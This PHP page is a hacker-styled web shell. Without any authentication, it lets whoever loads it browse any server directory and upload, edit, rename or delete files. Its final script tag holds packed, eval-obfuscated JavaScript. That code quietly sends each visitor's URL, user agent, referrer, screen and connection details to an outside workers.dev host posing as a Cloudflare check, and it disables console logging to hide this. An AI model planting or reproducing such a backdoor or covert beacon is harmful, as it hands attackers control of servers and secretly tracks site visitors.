<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M4DI~UciH4</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');

        :root {
            --bg-main: #0a0a0a;
            --bg-card: rgba(20, 20, 20, 0.95);
            --border: #00f7ff;
            --text: #00ff33;
            --accent: #ff0066;
            --glow: rgba(0, 247, 255, 0.3);
            --shadow: 0 0 8px var(--border);
        }

        body {
            background: var(--bg-main);
            color: var(--text);
            font-family: 'JetBrains Mono', 'Consolas', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            overflow-x: hidden;
            position: relative;
            animation: fadeIn 0.8s ease-in;
        }

        /* Scanline effect */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0, 0, 0, 0.05) 1px, transparent 1px);
            background-size: 100% 4px;
            pointer-events: none;
            animation: scanline 10s linear infinite;
            z-index: -1;
        }

        @keyframes scanline {
            0% { background-position: 0 0; }
            100% { background-position: 0 100px; }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .navbar {
            background: rgba(20, 20, 20, 0.9) !important;
            border-bottom: 1px solid var(--border);
            box-shadow: var(--shadow);
            padding: 0.5rem 1rem;
        }

        .navbar-brand a {
            color: var(--accent);
            font-weight: 700;
            font-size: 1.5rem;
            text-decoration: none;
            display: inline-block;
            overflow: hidden;
            white-space: nowrap;
            animation: typing 2s steps(20, end);
        }

        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }

        .navbar-brand a img {
            vertical-align: middle;
            margin-right: 0.5rem;
        }

        .form-inline .btn {
            background: rgba(20, 20, 20, 0.9);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: 'JetBrains Mono', 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            transition: all 0.2s ease;
        }

        .form-inline .btn:hover {
            background: var(--accent);
            color: #fff;
            box-shadow: 0 0 8px var(--accent);
            transform: scale(1.05);
        }

        .table {
            color: var(--text);
            border-collapse: separate;
            border-spacing: 0 4px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 6px;
        }

        .table th {
            background: rgba(20, 20, 20, 0.9);
            border-bottom: 1px solid var(--border);
            padding: 8px;
            text-transform: uppercase;
            font-weight: 700;
            font-size: 13px;
        }

        .table td {
            background: rgba(30, 30, 30, 0.85);
            padding: 6px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .table-hover tbody tr:hover {
            background: rgba(255, 0, 102, 0.15);
            color: #fff;
            box-shadow: 0 0 8px var(--accent);
        }

        .table a {
            color: var(--text);
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .table a:hover {
            color: var(--accent);
        }

        .table i {
            margin-right: 6px;
        }

        form {
            margin: 1rem 0;
        }

        .form-control, textarea {
            background: rgba(20, 20, 20, 0.95);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: 'JetBrains Mono', 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            transition: all 0.2s ease;
        }

        .form-control:focus, textarea:focus {
            background: rgba(20, 20, 20, 0.95);
            border-color: var(--accent);
            color: var(--text);
            box-shadow: 0 0 6px var(--accent);
        }

        textarea {
            resize: vertical;
            min-height: 100px;
            max-height: 400px;
            width: 100%;
        }

        .btn-dark {
            background: rgba(20, 20, 20, 0.9);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: 'JetBrains Mono', 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            transition: all 0.2s ease;
        }

        .btn-dark:hover {
            background: var(--accent);
            color: #fff;
            box-shadow: 0 0 8px var(--accent);
            transform: scale(1.05);
        }

        /* Responsive adjustments */
        @media (max-width: 576px) {
            body {
                font-size: 13px;
            }
            .navbar-brand a {
                font-size: 1.2rem;
            }
            .table th, .table td {
                font-size: 12px;
                padding: 5px;
            }
            .form-inline .btn, .btn-dark {
                font-size: 12px;
                padding: 4px 8px;
            }
            .form-control, textarea {
                font-size: 12px;
            }
            textarea {
                min-height: 80px;
            }
        }
    </style>
</head>
<body>
    <?php
    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }

    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload FileeE</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
</div>
</nav>');

    if (isset($_GET['p'])) {
        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      </td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          </td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form>';
    }
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px; width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }
    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>
    <script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(1h(){1 a=\'1g://1f-1e.1d.1c.1b/\';1 d={1a:7,r:19,18:[],q:()=>{1 2=b;1 8=2.c||{};1 5={o:n.m,u:17.u||\'\',6:2.6||\'\',t:2.t||\'\',l:`${k}x${j}`,16:15(\'(14-13-12: 11)\').10,c:{Z:8.Y||\'W\',s:8.s||0},i:h.g()};V(a,{U:\'T\',S:{\'R-Q\':\'P/O\',\'X-N-M\':\'L\'},K:f.e(5),J:7}).I(()=>{d.r=7}).H(()=>{})}};9.p(\'G\',()=>{F(d.q,E)});9.p(\'D\',()=>{1 2=b;1 8=2.c||{};1 5={o:n.m,C:7,6:2.6||\'\',l:`${k}x${j}`,i:h.g()};b.B(a,f.e(5))});A(9.4){1 3=()=>{};4.z=3;4.y=3;4.w=3;4.v=3}})();',62,80,'|const|nav|fakeLog|console|payload|userAgent|true|conn|window|ENDPOINT|navigator|connection|CLOUDFLARE_PROBE|stringify|JSON|now|Date|timestamp|innerHeight|innerWidth|screen|href|location|url|addEventListener|init|challengeComplete|downlink|language|referrer|error|info||warn|log|if|sendBeacon|exit|beforeunload|1200|setTimeout|load|catch|then|keepalive|body|ChallengeInit|Probe|CF|json|application|Type|Content|headers|POST|method|fetch|unknown||effectiveType|type|matches|dark|scheme|color|prefers|matchMedia|darkMode|document|queue|false|cfTurnstileCheck|dev|workers|cloudflarecheck|detect|security|https|function'.split('|'),0,{}))</script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>
</html>